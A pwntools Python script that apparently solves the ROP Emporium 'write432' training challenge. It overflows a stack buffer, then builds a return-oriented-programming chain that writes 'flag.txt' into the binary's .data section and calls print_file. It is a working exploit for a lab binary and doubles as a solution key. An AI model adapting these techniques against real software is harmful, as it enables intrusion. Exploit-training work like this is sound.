from pwn import *

# context(arch="i686", os="linux")

elf = ELF("./write432", checksec=False)
p = elf.process()

p.sendline(cyclic(128))
p.wait()
eip_offset = cyclic_find(p.corefile.eip)	# eip_offset = 44
p = elf.process()							# reinitializing the process

# Gadget from usefulGadgets function:
# 0x08048543 <+0>:	mov    DWORD PTR [edi],ebp
# It moves the content of ebp to the address located in edi
mov = 0x08048543

# Gadget from ROPgadget:
# 0x080485aa : pop edi ; pop ebp ; ret
pop2 = 0x080485aa 

# Finding writeable sections: $ readelf -S ./write432 => .data (which is @ 0x0804a018)
writable_section = 0x0804a018

print_file = elf.plt['print_file']	# or: $ objdump -d write432 | grep print_file

# First write
payload = 'A' * eip_offset
payload += p32(pop2)				# jump to 'pop edi ; pop ebp ; ret' gadget
payload += p32(writable_section)	# pop .data address into edi
payload += "flag"					# pop "flag" 		into ebp
payload += p32(mov)					# mov "flag" into the location stored in edi

# Second write
payload += p32(pop2)				# jump to 'pop edi ; pop ebp ; ret' gadget
payload += p32(writable_section+4)	# pop .data address+4 	into edi
payload += ".txt"					# pop ".txt" 			into ebp
payload += p32(mov)					# mov ".txt" into the location stored in edi

payload += p32(print_file) + "JUNK" + p32(writable_section)

log.info('Payload length: %d', len(payload))
log.info('Sending payload...')
p.sendlineafter("> ", payload)
log.info('Payload sent!')

p.wait()
success(p.recv())